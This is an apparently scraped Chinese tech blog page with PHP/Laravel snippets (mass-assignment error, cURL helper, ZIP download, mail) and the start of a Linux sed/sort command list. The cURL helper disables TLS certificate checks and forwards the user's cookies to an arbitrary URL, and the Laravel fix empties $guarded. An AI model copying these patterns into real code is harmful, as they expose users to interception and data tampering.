<span class="title">use</span>(<span class="params">$bookQuery</span>)</span>&#123;</span><br><span class="line">            <span class="comment">//toSql()返回的是等待绑定参数的SQL语句</span></span><br><span class="line">            $join-&gt;mergeBindings($bookQuery-&gt;getQuery())-&gt;on(<span class="string">'u.id'</span>,<span class="string">'='</span>,<span class="string">'b.user_id'</span>);</span><br><span class="line">            <span class="comment">//mergeBindings是将SQl的参数进行绑定</span></span><br><span class="line">        &#125;)</span><br><span class="line">        -&gt;get();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $users;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="laravel-MassAssignmentException"><a href="#laravel-MassAssignmentException" class="headerlink" title="laravel MassAssignmentException"></a>laravel MassAssignmentException</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; $s= Stock::where([<span class="string">'uid'</span>=&gt;<span class="number">3230498441</span>,<span class="string">'readtime'</span>=&gt;<span class="number">0</span> ])-&gt;first()</span><br><span class="line">=&gt; &lt;Stock #0000000041071db4000000000f7f2b98&gt; &#123;</span><br><span class="line">       id: 678,</span><br><span class="line">       uuid: "01ec5da0-43ad-11e9-820c-217bded4b29c",</span><br><span class="line">       uid: 3230498441,</span><br><span class="line">       ctime: "2019-03-11 11:23:15",</span><br><span class="line">       readtime: 0</span><br><span class="line">   &#125;</span><br><span class="line">&gt;&gt;&gt; $s-&gt;update(['readtime'=&gt;time()])</span><br><span class="line">Illuminate\Database\Eloquent\MassAssignmentException with message 'readtime'</span><br><span class="line">cat  vendor\laravel\framework\src\Illuminate\Database\Eloquent\Model.php</span><br><span class="line"></span><br><span class="line">public function fill(array $attributes)</span><br><span class="line">	&#123;</span><br><span class="line">		$totallyGuarded = $this-&gt;totallyGuarded();</span><br><span class="line"></span><br><span class="line">		foreach ($this-&gt;fillableFromArray($attributes) as $key =&gt; $value)</span><br><span class="line">		&#123;</span><br><span class="line">			$key = $this-&gt;removeTableFromKey($key);</span><br><span class="line"></span><br><span class="line">			// The developers may choose to place some attributes in the "fillable"</span><br><span class="line">			// array, which means only those attributes may be set through mass</span><br><span class="line">			// assignment to the model, and all others will just be ignored.</span><br><span class="line">			if ($this-&gt;isFillable($key))</span><br><span class="line">			&#123;</span><br><span class="line">				$this-&gt;setAttribute($key, $value);</span><br><span class="line">			&#125;</span><br><span class="line">			elseif ($totallyGuarded)</span><br><span class="line">			&#123;</span><br><span class="line">				throw new MassAssignmentException($key);//这里报错</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		return $this;</span><br><span class="line">	&#125;</span><br><span class="line">public function totallyGuarded()</span><br><span class="line">	&#123;</span><br><span class="line">		return count($this-&gt;fillable) == 0 &amp;&amp; $this-&gt;guarded == array('*');</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	model文件添加 protected $guarded = [];</span><br><span class="line">这个问题的关键是 save 方法，因为这个方法在不同的环境下会有不同的效果。如果一个 Model 他还不存在，则调用 save 方法的作用是 insert 一条记录。如果此 Model 已经存在于数据库，则调用 save 方法的效果是 Update 这条存在的记录。</span><br><span class="line">所以文档强调的是：如果你调用 save 方法来更新 Model，那么只有这个 Model 对应的数据存在于数据库中时，才会触发 updating 和 updated 事件（因为不存在的话就是 insert 操作，会触发 creating 和 craeted 事件）。如果你调用 save 方法来保存或更新 Model，那么不管数据记录是否已经存在，都会触发 saving 和 saved 这两个事件。文档表述可能存在问题，但意思是这个意思。https://learnku.com/laravel/t/8942/is-the-updating-and-updated-event-triggered-description-discrepancy</span><br></pre></td></tr></table></figure>
<h3 id="1234567890-转换成-1-234-567-890"><a href="#1234567890-转换成-1-234-567-890" class="headerlink" title="1234567890 转换成 1,234,567,890"></a>1234567890 转换成 1,234,567,890</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$str=<span class="string">'1234567890'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">  $str=strrev($str);<span class="comment">//先翻转字符串 https://learnku.com/articles/25953#reply84620</span></span><br><span class="line">  $arr=str_split($str,<span class="number">3</span>);<span class="comment">//每3个隔开</span></span><br><span class="line">  $str=strrev(implode(<span class="string">','</span>,$arr));<span class="comment">//在把数组以，变成字符串 在翻转</span></span><br><span class="line">  echo $str;</span><br><span class="line">&#125;</span><br><span class="line">&gt;&gt;&gt; number_format(<span class="string">'1234567890'</span>,<span class="number">3</span>,<span class="string">','</span>,<span class="string">','</span>);</span><br><span class="line">=&gt; <span class="string">"1,234,567,890,000"</span></span><br></pre></td></tr></table></figure>
<h3 id="curl-cookie"><a href="#curl-cookie" class="headerlink" title="curl cookie"></a>curl cookie</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mycurl(<span class="string">'xxx'</span>,<span class="number">3</span>,<span class="number">3</span>,$_COOKIE)</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myCurl</span>(<span class="params">$url,$time=<span class="number">3</span>,$retries = <span class="number">3</span>, $cookie = []</span>)</span>&#123;</span><br><span class="line">		$ch = curl_init();</span><br><span class="line">		curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">		curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">		curl_setopt($ch, CURLOPT_TIMEOUT, $time); <span class="comment">//</span></span><br><span class="line">		curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,<span class="literal">false</span>);</span><br><span class="line">		curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,<span class="literal">false</span>);</span><br><span class="line">		<span class="keyword">if</span>($cookie) &#123;</span><br><span class="line">            curl_setopt($ch, CURLOPT_COOKIE, http_build_query($cookie, <span class="string">''</span>, <span class="string">';'</span>));<span class="comment">//a=1;b=2</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">		$result = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span>(($result === <span class="literal">false</span>) &amp;&amp; (--$retries &gt; <span class="number">0</span>))&#123;</span><br><span class="line">			$result = curl_exec($ch);</span><br><span class="line">		&#125;</span><br><span class="line">		curl_close($ch);</span><br><span class="line">		<span class="keyword">return</span> $result;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<h3 id="创建-Zip-压缩文件并提供下载"><a href="#创建-Zip-压缩文件并提供下载" class="headerlink" title="创建 Zip 压缩文件并提供下载"></a>创建 Zip 压缩文件并提供下载</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">$zip_file = <span class="string">'invoices.zip'</span>; <span class="comment">// 要下载的压缩包的名称 https://learnku.com/laravel/t/26087</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化 PHP 类</span></span><br><span class="line">$zip = <span class="keyword">new</span> \ZipArchive();</span><br><span class="line">$zip-&gt;open($zip_file, \ZipArchive::CREATE | \ZipArchive::OVERWRITE);</span><br><span class="line"></span><br><span class="line">$invoice_file = <span class="string">'invoices/aaa001.pdf'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加文件：第二个参数是待压缩文件在压缩包中的路径</span></span><br><span class="line"><span class="comment">// 所以，它将在 ZIP 中创建另一个名为 "storage/" 的路径，并把文件放入目录。</span></span><br><span class="line">$zip-&gt;addFile(storage_path($invoice_file), $invoice_file);</span><br><span class="line">$zip-&gt;close();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 我们将会在文件下载后立刻把文件返回原样</span></span><br><span class="line"><span class="keyword">return</span> response()-&gt;download($zip_file);</span><br><span class="line"></span><br><span class="line">$zip_file = <span class="string">'invoices.zip'</span>;</span><br><span class="line">$zip = <span class="keyword">new</span> \ZipArchive();</span><br><span class="line">$zip-&gt;open($zip_file, \ZipArchive::CREATE | \ZipArchive::OVERWRITE);</span><br><span class="line"></span><br><span class="line">$path = storage_path(<span class="string">'invoices'</span>);</span><br><span class="line">$files = <span class="keyword">new</span> \RecursiveIteratorIterator(<span class="keyword">new</span> \RecursiveDirectoryIterator($path));</span><br><span class="line">foreach ($files <span class="keyword">as</span> $name =&gt; $file)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 我们要跳过所有子目录</span></span><br><span class="line">    <span class="keyword">if</span> (!$file-&gt;isDir()) &#123;</span><br><span class="line">        $filePath     = $file-&gt;getRealPath();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 用 substr/strlen 获取文件扩展名</span></span><br><span class="line">        $relativePath = <span class="string">'invoices/'</span> . substr($filePath, strlen($path) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        $zip-&gt;addFile($filePath, $relativePath);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$zip-&gt;close();</span><br><span class="line"><span class="keyword">return</span> response()-&gt;download($zip_file);</span><br></pre></td></tr></table></figure>
<h3 id="php-email"><a href="#php-email" class="headerlink" title="php email"></a>php email</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">[root@localhost ~]# service sendmail status</span><br><span class="line">sendmail is stopped</span><br><span class="line">sm-client is stopped</span><br><span class="line">[root@localhost ~]# service sendmail start</span><br><span class="line">Starting sendmail:                                         [  OK  ]</span><br><span class="line">Starting sm-client:                                        [  OK  ]</span><br><span class="line">[root@localhost ~]# service sendmail status</span><br><span class="line">sendmail (pid  <span class="number">8746</span>) is running...</span><br><span class="line">sm-client (pid  <span class="number">8756</span>) is running...</span><br><span class="line"></span><br><span class="line">$to = <span class="string">'user@example.com'</span>;</span><br><span class="line">$subject = <span class="string">"Beautiful HTML Email using PHP by CodexWorld"</span>;</span><br><span class="line">$htmlContent = file_get_contents(<span class="string">"email_template.html"</span>);</span><br><span class="line">$htmlContent = <span class="string">'</span></span><br><span class="line"><span class="string">    &lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;Welcome to CodexWorld&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Thanks you for joining with us!&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;table cellspacing="0" style="border: 2px dashed #FB4314; width: 300px; height: 200px;"&gt;</span></span><br><span class="line"><span class="string">            &lt;tr&gt;</span></span><br><span class="line"><span class="string">                &lt;th&gt;Name:&lt;/th&gt;&lt;td&gt;CodexWorld&lt;/td&gt;</span></span><br><span class="line"><span class="string">            &lt;/tr&gt;</span></span><br><span class="line"><span class="string">            &lt;tr style="background-color: #e0e0e0;"&gt;</span></span><br><span class="line"><span class="string">                &lt;th&gt;Email:&lt;/th&gt;&lt;td&gt;contact@codexworld.com&lt;/td&gt;</span></span><br><span class="line"><span class="string">            &lt;/tr&gt;</span></span><br><span class="line"><span class="string">            &lt;tr&gt;</span></span><br><span class="line"><span class="string">                &lt;th&gt;Website:&lt;/th&gt;&lt;td&gt;&lt;a href="http://www.codexworld.com"&gt;www.codexworld.com&lt;/a&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">            &lt;/tr&gt;</span></span><br><span class="line"><span class="string">        &lt;/table&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set content-type header for sending HTML email</span></span><br><span class="line">$headers = <span class="string">"MIME-Version: 1.0"</span> . <span class="string">"\r\n"</span>;</span><br><span class="line">$headers .= <span class="string">"Content-type:text/html;charset=UTF-8"</span> . <span class="string">"\r\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Additional headers  https://www.codexworld.com/send-beautiful-html-email-using-php/</span></span><br><span class="line">$headers .= <span class="string">'From: CodexWorld&lt;sender@example.com&gt;'</span> . <span class="string">"\r\n"</span>;</span><br><span class="line">$headers .= <span class="string">'Cc: welcome@example.com'</span> . <span class="string">"\r\n"</span>;</span><br><span class="line">$headers .= <span class="string">'Bcc: welcome2@example.com'</span> . <span class="string">"\r\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Send email</span></span><br><span class="line"><span class="keyword">if</span>(mail($to,$subject,$htmlContent,$headers)):</span><br><span class="line">    $successMsg = <span class="string">'Email has sent successfully.'</span>;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    $errorMsg = <span class="string">'Email sending fail.'</span>;</span><br><span class="line">endif;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$to = <span class="string">'maryjane@email.com'</span>;</span><br><span class="line">$subject = <span class="string">'Marriage Proposal'</span>;</span><br><span class="line">$message = <span class="string">'Hi Jane, will you marry me?'</span>; </span><br><span class="line">$<span class="keyword">from</span> = <span class="string">'peterparker@email.com'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Sending email</span></span><br><span class="line"><span class="keyword">if</span>(mail($to, $subject, $message))&#123;</span><br><span class="line">    echo <span class="string">'Your mail has been sent successfully.'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    echo <span class="string">'Unable to send email. Please try again.'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://segmentfault.com/a/1190000018479250?utm_source=tag-newest" target="_blank" rel="noopener">PHP+openssl实现非对称加密</a></p>
<p><a href="http://eienao.com/posts/build-a-lnmp-runtime-environment-from-scratch.html" target="_blank" rel="noopener">从零开始搭建一个lnmp运行环境</a></p>
<p><a href="https://learnku.com/articles/17867" target="_blank" rel="noopener">Session 与 Token 身份验证</a></p>
<p><a href="http://www.cnblogs.com/skynet/archive/2011/05/03/2035105.html" target="_blank" rel="noopener">字符集和字符编码</a></p>
<p><a href="https://learnku.com/articles/22338" target="_blank" rel="noopener">php函数</a></p>
<p><a href="https://learnku.com/articles/22694" target="_blank" rel="noopener">PHP导出百万Excel</a></p>
<p><a href="https://laravel-china.org/articles/22483" target="_blank" rel="noopener">PHP 编写守护进程</a></p>
<p><a href="http://kuanghy.github.io/2015/11/25/php-isimg" target="_blank" rel="noopener">判断文件是否为图片的方法</a></p>
<p><a href="https://www.goozp.com/article/9.html" target="_blank" rel="noopener">消息队列及PHP中的简单实现与应用</a></p>
<p><a href="https://laravel-china.org/articles/19876" target="_blank" rel="noopener">Laravel Eloquent 提示和技巧 </a></p>
<p><a href="https://laravel-china.org/articles/20712" target="_blank" rel="noopener">Laravel 中的 Event 和事件的概念</a></p>
<p><a href="https://www.raymondwu.net/2018/07/30/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-%E5%93%A8%E5%85%B5-%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2/" target="_blank" rel="noopener">Redis 主从复制、哨兵及集群部署</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/27/linux-常用命令/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/27/linux-常用命令/" itemprop="url">linux常用命令收集</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-27T10:14:14+08:00">
                2018-12-27
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  5.9k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  27 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">删除某行</span><br><span class="line"></span><br><span class="line">对<span class="number">98</span>k.txt的行进行操作，将操作结果输出到终端（只是做模拟操作，不改动源文件）</span><br><span class="line"></span><br><span class="line">sed "1d" 98k.txt         # 输出删除第一行后的文件内容</span><br><span class="line">sed "$d" 98k.txt         # 输出删除最后一行后的文件内容</span><br><span class="line">sed "1,2d" 98k.txt       # 输出删除第一行到第二行后的文件内容</span><br><span class="line">sed "2,$d" 98k.txt       # 输出删除第2行到最后1行后的文件内容</span><br><span class="line"></span><br><span class="line">显示某行</span><br><span class="line"></span><br><span class="line">sed -n "1p" 98k.txt           # 只显示文件的第一行 </span><br><span class="line">sed -n "$p" 98k.txt           # 只显示文件的最后一行</span><br><span class="line">sed -n "1,2p" 98k.txt         # 只显示文件的第一行到第二行</span><br><span class="line">sed -n "2,$p" 98k.txt         # 显示文件的第二行到最后一行</span><br><span class="line"></span><br><span class="line">使用安静模式进行查询</span><br><span class="line"></span><br><span class="line">sed -n <span class="string">"/ruby/p"</span> <span class="number">98</span>k.txt</span><br><span class="line">输出关键字ruby所在行的内容；其中<span class="string">"/str/p"</span>，str为搜索的文本内容</span><br><span class="line">sed -n <span class="string">"/\$/p"</span> <span class="number">98</span>k.txt</span><br><span class="line">输出关键字$所在行的内容，使用反斜线\屏蔽特殊含义</span><br><span class="line"></span><br><span class="line">增加一行或多行字符串</span><br><span class="line"></span><br><span class="line">sed "1a drink tea" 98k.txt            # 在第一行后增加字符串"drink tea"</span><br><span class="line">sed "1,3a drink tea" 98k.txt          # 在第一行到第三行后增加字符串"drink tea"</span><br><span class="line">sed "1a drink tea\nor coffee" 98k.txt # 在第一行后增加两行，换行使用\n，可多次使用\n添加多行</span><br><span class="line"></span><br><span class="line">增加另外一个文件的内容</span><br><span class="line"></span><br><span class="line">sed "1r 1.txt" 98k.txt     # 把1.txt的内容增加到98k.txt的第一行后</span><br><span class="line"></span><br><span class="line">替代一行或多行</span><br><span class="line"></span><br><span class="line">sed "1c Hi" 98k.txt    # 把98k.txt的第一行替换为Hi</span><br><span class="line">sed "1,2c Hi" 98k.txt  # 把98k.txt的第一行到第二行替换为Hi</span><br><span class="line"></span><br><span class="line">替换一行中的某部分字符串</span><br><span class="line"></span><br><span class="line">格式：sed <span class="string">"s/要替换的字符串/新的字符串/g"</span> <span class="number">98</span>k.txt （要替换的字符串可以用正则表达式）</span><br><span class="line"></span><br><span class="line">sed "s/ruby/bird/g" 98k.txt   # 把全部的ruby替换为bird</span><br><span class="line">sed "s/ruby//g" 98k.txt       # 把全部的ruby替换为空，即删除ruby字符串</span><br><span class="line"></span><br><span class="line"># 对每行匹配到的第一个字符串进行替换</span><br><span class="line">sed -i <span class="string">"s/原字符串/新字符串/"</span> <span class="number">98</span>k.txt</span><br><span class="line"></span><br><span class="line"># 对全局匹配上的所有字符串进行替换</span><br><span class="line">sed -i <span class="string">"s/原字符串/新字符串/g"</span> <span class="number">98</span>k.txt</span><br><span class="line"></span><br><span class="line"># 删除所有匹配到字符串的行</span><br><span class="line">sed -i <span class="string">"/匹配字符串/d"</span>  <span class="number">98</span>k.txt</span><br><span class="line"></span><br><span class="line"># 特定字符串的行后插入新行</span><br><span class="line">sed -i <span class="string">"/特定字符串/a 新行字符串"</span> <span class="number">98</span>k.txt</span><br><span class="line"></span><br><span class="line"># 特定字符串的行前插入新行</span><br><span class="line">sed -i <span class="string">"/特定字符串/i 新行字符串"</span> <span class="number">98</span>k.txt</span><br><span class="line"></span><br><span class="line"># 把匹配行中的某个字符串替换为目标字符串</span><br><span class="line">sed -i <span class="string">"/匹配字符串/s/源字符串/目标字符串/g"</span> <span class="number">98</span>k.txt</span><br><span class="line"></span><br><span class="line"># 在文件98k.txt中的末行之后，添加bye</span><br><span class="line">sed -i <span class="string">"$a bye"</span> <span class="number">98</span>k.txt</span><br><span class="line"></span><br><span class="line"># 对于文件第3行，把匹配上的所有字符串进行替换</span><br><span class="line">sed -i <span class="string">"3s/原字符串/新字符串/g"</span> <span class="number">98</span>k.txt</span><br><span class="line"></span><br><span class="line">echo hello|sed 's/hello/(&amp;)/' #将hello放在扩号中</span><br><span class="line">sed -i <span class="string">'/DEVICE/c\Ethernet'</span> test </span><br><span class="line">nl /etc/passwd | sed <span class="string">'2i drink tea'</span> </span><br><span class="line">sed -i '/connect/s#YES#NO#' test    #匹配connect的行，把YES替换成NO </span><br><span class="line"> 将文件的分隔符从逗号更改为管道</span><br><span class="line">head mydata.csv | sed <span class="string">'s/,/|/g'</span></span><br></pre></td></tr></table></figure>
<h3 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">sort [-fbMnrtuk] [file or stdin]</span><br><span class="line">选项与参数：</span><br><span class="line">-f  ：忽略大小写的差异，例如 A 与 a 视为编码相同；</span><br><span class="line">-b  ：忽略最前面的空格符部分；</span><br><span class="line">-M  ：以月份的名字来排序，例如 JAN, DEC 等等的排序方法；</span><br><span class="line">-n  ：使用『纯数字』进行排序(默认是以文字型态来排序的)；</span><br><span class="line">-r  ：反向排序；</span><br><span class="line">-u  ：就是 uniq ，相同的数据中，仅出现一行代表；</span><br><span class="line">-t  ：分隔符，默认是用 [tab] 键来分隔；</span><br><span class="line">-k  ：以那个区间 (field) 来进行排序的意思</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">sort -m file1 file2 合并两个文件</span><br><span class="line">sort file1&gt;file1；cat file1，你会得到一个空文件。这时候要使用-o参数来实现这个功能。</span><br><span class="line">-n是按照数字大小排序，-r是以相反顺序，-k是指定需要爱排序的栏位，-t指定栏位分隔符为冒号</span><br><span class="line">sort file1 -o file1</span><br><span class="line">sort -u是全文本去重，而uniq是比较相邻行，将第二个及以后更多重复行删去。</span><br><span class="line">sort file2 |uniq -c file</span><br><span class="line">删除重复行：</span><br><span class="line"></span><br><span class="line">　　uniq file.txt 　　</span><br><span class="line"></span><br><span class="line">　　sort file.txt | uniq 　　</span><br><span 